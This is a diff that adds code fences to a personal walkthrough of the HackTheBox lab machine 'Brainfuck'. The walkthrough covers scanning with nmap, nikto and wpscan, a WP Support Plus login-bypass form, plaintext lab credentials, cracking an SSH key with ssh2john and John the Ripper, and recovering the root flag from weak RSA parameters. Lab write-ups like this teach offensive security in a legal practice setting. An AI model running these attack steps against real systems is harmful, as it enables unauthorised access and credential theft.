@@ -14,7 +14,7 @@ With this machine I learned about cryptography how it is used and another way to
 -----
 #### Step 1 - Enumeration
 -----
-
+```bat
     nmap -sC -sV -oA namp 10.10.10.17
     Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-12 10:37 EDT
     Nmap scan report for 10.10.10.17
@@ -45,7 +45,7 @@ With this machine I learned about cryptography how it is used and another way to
     | tls-nextprotoneg: 
     |_  http/1.1
     Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernelI
-
+```
 I started the machine with a scan this has shown multiple ports open 443, 22 to name some of the most intersting ones.
 
 Next I look at the webpages to see if there is any information about the software used or anything that may leed to more intersting information. 
@@ -57,7 +57,7 @@ Next I look at the webpages to see if there is any information about the softwar
 At first I tried searching the ip of the machine with port 443, this did not work and after a bit of searching online and looking at the nmap scan better I found that with ssl you need to add the names to dns server so in my case i had to add 
 Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
 These two to my machine. To do this I had to modify 
-
+```bat
     cat /etc/hosts
 
     127.0.0.1 localhost
@@ -67,11 +67,11 @@ These two to my machine. To do this I had to modify
     ::1     localhost ip6-localhost ip6-loopback
     ff02::1 ip6-allnodes
     ff02::2 ip6-allrouters
-
+```
 This made it possible to access the webpages.
 
 Next i ran nikto on the machine to find any sub pages but instead I found some email address
-    
+```bat
     nikto -h https://brainfuck.htb
     - Nikto v2.1.6
     ---------------------------------------------------------------------------
@@ -89,9 +89,9 @@ Next i ran nikto on the machine to find any sub pages but instead I found some e
 
     + Start Time:         2020-05-25 16:44:44 (GMT-4)
     ---------------------------------------------------------------------------
-
+```
 Also after taking a look at the webpages and inspecting the sources i found some wp-content packages which led me to believe the website was made with wordpress. Therefore I had to use the wordpress scanning service that I found online. 
-
+```bat
         wpscan --url https://brainfuck.htb -e u,ap --disable-tls-checks
     _______________________________________________________________
             __          _______   _____
@@ -204,7 +204,7 @@ Also after taking a look at the webpages and inspecting the sources i found some
     [+] Data Received: 239.483 KB
     [+] Memory used: 215.93 MB
     [+] Elapsed time: 00:00:22
-
+```
 
 
 ### Step 2 -Exploitation
@@ -212,7 +212,7 @@ Also after taking a look at the webpages and inspecting the sources i found some
 
 This lead to finding the version of wordpress and the next logical step was to look in searchsploit to see if I can find any exploits for this version.
 
-
+```bat
     searchsploit wp support plus
     ------------------------------------------------------------------------------------------ ---------------------------------
     Exploit Title                                                                            |  Path
@@ -246,7 +246,7 @@ This lead to finding the version of wordpress and the next logical step was to l
             <input type="hidden" name="action" value="loginGuestFacebook">
             <input type="submit" value="Login">
     </form>
-
+```
 
 After putting that in a file and looking better at it I was able to determine that it was a login page 
 
@@ -264,17 +264,17 @@ this was the path to the admin page. This took longer than I would like to admit
 
 From the admin page we are able to find a plugin  that is used for smtp, looking at it more in detail it has the credentials to login with email.
 As such what we do we get the credentials 
-
+```bat
     orestis@brainfuck.htb | KHGuERB29DNiNE
-
+```
 
 
 This was fairly easy, the only trick was to know how to change the password view from inspector to plaintext by changeing type=password to type=text.
 
 Next I used thunderbird to login to the actual inbox where I found some other credentials that I did not yet know what to do with them.
-
+```bat
     orestis | kIEnnfEKJ#9UmdO
-
+```
 After while I decided to work on the other url that I had, then I realized that was a chat and I was able to use the credentials to log in to a specific admin user that had conversations. 
 
 There we find what looks to be an encrypted conversation.
@@ -290,18 +290,18 @@ https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa <- A link th
 
 Sadly the rsa is encrypted with a password that is not found in the conversation as such I had to use John the ripper.
 For this I found a method online with using a specific tool
-
+```bat
      https://raw.githubusercontent.com/koboi137/john/bionic/ssh2john.py
      python ssh2john id_rsa > brainfuck.txt
-
+```
 This creates this file 
-
+```bat
     id_rsa:$ssh2$2d2d2d2d2d424547494e205253412050524956415445204b45592d2d2d2d2d0a50726f632d547970653a20342c454e435259505445440a44454b2d496e666f3a204145532d3132382d4342432c36393034464546313933393737383646373542453244373736324145373338320a0a6d6e6561672f5943593841422b4f4c64726774794b716e72645448776d705747544e573970666848734e7a38436647644178676368556148656f546a2f72682f0a42326e53342b394359424b38495233567435466f37506f5742436a41417757596c782b634b3077314458716133412b424c6c735349304b7773396a65613647690a57316d612f5637576f4a4a2b56344a4e49377566546851794f45554f3736506c594e524d39554546384d414e516d4a4b33374d6439457a753533774a7055715a0a37644b636736414d2f6f3956684f6c7069583753494e543964524b614b65764f6a6f7052627945464d6c6950303148375a6c616857506452526d664358536d510a7a78483949326c47495154745252413372466b744c704e65644e50755a51435373775565633765565674326d63325a7639504d396c43544a7552537a7a56756d0a6f7a3358456e6861476d50316a6d4d6f56425769442b3252726e4c36776e7a396b7373562b74674356306d44393757532b3179645745506543706830364d656d0a644c52324c31757642474a6576386939685033746870316f77764d384867696479664d4332764f427658626341413362444b7652346a737a326f62663541462b0a46767436706d4d756978386862697050313132557335347954762f6879432b4d356731685755756a357934786f766772304c4c6649327047652b4676356c58540a6d637a6e63315a714459356c726c6d577a54767357376837726d394c4b674569486e3967476771694f6c524b6e3546556c2b446c6661414d48576959554b59730a4c534d5676444936773838675a623130324b44326b344e563050364f645849434a414d4561316d534f6b2f4c532f6d4c4f3465304e337745582b4e74675662710a756c396775536c6f626173495835446b4163592b4552336a2b2f5965667079456e59732b2f74665454316f4d2b4252335456536c4a634f72764e6d72497935390a6b724b5674756c7841656a56517a78496d574f554459433934375458753942417368304d4c6f4b747049524c33486362752b7669394c356e6e354c6b684f2f560a67644d794f7941546f7237416d7532786239334f4f3535584b6b42316c697732726c576736734270584d315755676f4d515735304b656f364f306a7a654766410a56776d4d373258626175676d684b573235712f34362f794c34564d4b754479484c3548632b4f763576336251393038702b55726630346470766a39536a427a6e0a736368716f7a6f6763433155664a63436d36636c2b3936374746426133724435594470337832787949563953516477477648305a49637030644b4b6b4d565a740a5558386854717631524f5234436b3847317a4d36576334517148364455714769337472376e597779377778314a4a36575268707957644c2b7375386639364b6e0a463767775a4c745650383764385233754145525a6e78464f394d754f5a55322b50456e4458645343534d76337158394676505959334f504b6273786941792b4d0a775a657a4c4e69703830586d63564a7747555973646e2b69422f55504d64645831324a333059556274772f52333454516952465568574c5446726d4f614c61620a49716c354c2b304a4562655a394f3536446158467150336758684d783878424b555161783265786f5472656f7843493537617842514271546845672f485443790a4951506d485733366d7874632b496c4d444578644c485744376d6e4e75496453686941523662585959534d3345373235667a4c45314d46753435566b484469460a6d7879394556512b7634396b6734794677554e505062734f70704b6337674a57705331592f692b72444b67385a4e56335449623554417149715152675a7170500a4376665052706d4c5552516e766c793839585839374a474a5253474a6862414371554d5a6e66774670785a386150735677736f585279757562343361374774460a39446979436268477546327a59636d4b6a5235454f4f543748736771514963414f4d495735357132464a707148312b505538654966467a6b68555930716f47530a4542466b5a75435079756a594f547976515a657779642b61783733484f49375a486f79384378446b6a5362495879414c79416137497033616764744f506e6d690a3668442b6a7876627078466738696764745a6c683950736649676b4e5a4b3852716e50796d4150437976526d386337765a4648345377516744354658547747510a2d2d2d2d2d454e44205253412050524956415445204b45592d2d2d2d2d0a*1766*0
-
+```
 With this file format we can send it to john the ripper
-
+```bat
     john brainfuck.txt — wordlist=/usr/share/wordlists/rockyou.txt
-
+```
 Which outputs the following credentials 
 
     orestis | 3poulakia!
@@ -311,13 +311,13 @@ Which can be used to gain a foothold
 ---
 ### Step 3 - Foothold
 ---
-
+```bat
     ssh -i id_rsa orestis@brainfuck.htb
-
+```
 when prompted for the password you can use the one that we just discoverd 
 
 In here we find the user flag.
-
+```bat
     orestis@brainfuck:~$ ls -l
     total 20
     -rw------- 1 orestis orestis  619 Apr 29  2017 debug.txt
@@ -325,7 +325,7 @@ In here we find the user flag.
     drwx------ 3 orestis orestis 4096 Apr 29  2017 mail
     -rw------- 1 orestis orestis  329 Apr 29  2017 output.txt
     -r-------- 1 orestis orestis   33 Apr 29  2017 user.txt     
-
+```
 
 ---
 ### Step 4 - Privilage Escalation
@@ -334,7 +334,7 @@ In here we find the user flag.
 For the root password there was a special way to do it that I had to take from the writeup because I had no idea how to implement it myself.
 
 The encrypt.sage file had a way to get root. 
-
+```bat
     nbits = 1024
 
     password = open("/root/root.txt").read().strip()
@@ -355,11 +355,11 @@ The encrypt.sage file had a way to get root.
     debug.write(str(p)+'\n')
     debug.write(str(q)+'\n')
     debug.write(str(e)+'\n')
-
+```
 Apperently sage is a programming library. And from i can understand from this code the file is used to get the actual flag.
 
 After looking around there was a script written just for this 
-
+```bat
     https://gist.githubusercontent.com/intrd/3f6e8f02e16faa54729b9288a8f59582/raw/8c7f3dd980bdbaa42a49e5f25ea62e74fd637b71/rsa_egcd.py
 
 
@@ -400,5 +400,5 @@ After looking around there was a script written just for this
     q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
     e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
     ct = 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
-
+```
 We get the root file contents with the flag.
